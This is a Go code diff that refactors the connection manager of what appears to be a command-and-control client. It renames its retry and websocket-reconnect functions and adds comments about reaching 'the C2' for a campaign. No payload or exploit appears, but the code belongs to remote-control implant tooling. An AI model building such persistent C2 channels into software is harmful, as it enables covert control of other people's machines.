@@ -12,6 +12,7 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
+// Upstreammanger makes sure there is a connection to the server via one of the upstreams
 type UpstreamManager struct {
 	Channel chan model.Packet
 
@@ -36,9 +37,9 @@ func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) Upst
 	return u
 }
 
-// Connect will until the C2 can be reached. This is basically the client/entry of the actual Upstream
-func (d *UpstreamManager) Connect() error {
-	// The Main Loop
+// Connect will try until the C2 can be reached via a upstream.
+func (d *UpstreamManager) Connect() {
+	// Loop which retrieves packets from the active upstream and sends it to client
 	var packet model.Packet
 	var connected bool
 	go func() {
@@ -47,29 +48,23 @@ func (d *UpstreamManager) Connect() error {
 			select {
 			case packet, connected = <-d.UpstreamWs.ChanIncoming():
 				if !connected {
-					d.Reconnect() // Blocks until we can reach server again
-					continue      // We are connected again, do as before
+					d.ReconnectWebsocket() // Blocks until we can reach server again
+					continue               // We are connected again, do as before
 				}
-
 			case packet, connected = <-d.UpstreamHttp.ChanIncoming():
+				// No reconnect handling atm
 			}
+
+			// Send the packet to client
 			d.Channel <- packet
 		}
 	}()
 
-	d.Connect2()
-	return nil
+	d.ConnectRetryForever()
 }
 
-func (d *UpstreamManager) Reconnect() {
-	// Throw away old UpstreamWs, and try to connect again
-	upstreamWs := MakeUpstreamWs(d.config, d.campaign)
-	d.UpstreamWs = &upstreamWs
-	log.Infof("Upstream websocket disconnectd. Retrying...")
-	d.Connect2()
-}
-
-func (d *UpstreamManager) Connect2() error {
+// ConnectRetryForever will try to connect to the server, forever. Then starts upstreams
+func (d *UpstreamManager) ConnectRetryForever() error {
 	for {
 		if d.campaign.ClientUseWebsocket {
 			// Try: Websocket
@@ -97,6 +92,16 @@ func (d *UpstreamManager) Connect2() error {
 	return nil
 }
 
+// Reconnect will destroy the currect WS upstream, and block until connected again
+func (d *UpstreamManager) ReconnectWebsocket() {
+	// Throw away old UpstreamWs, and try to connect again
+	upstreamWs := MakeUpstreamWs(d.config, d.campaign)
+	d.UpstreamWs = &upstreamWs
+	log.Infof("Upstream websocket disconnectd. Retrying...")
+	d.ConnectRetryForever()
+}
+
+// SendOutofBand will send a packet to the server according to a connected upstream
 func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
 	for {
 		if d.UpstreamWs.Connected() {
@@ -114,6 +119,7 @@ func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
 	return nil
 }
 
+// sendPing will send a ping message to the server
 func (d *UpstreamManager) sendPing() {
 	arguments := make(model.PacketArgument)
 
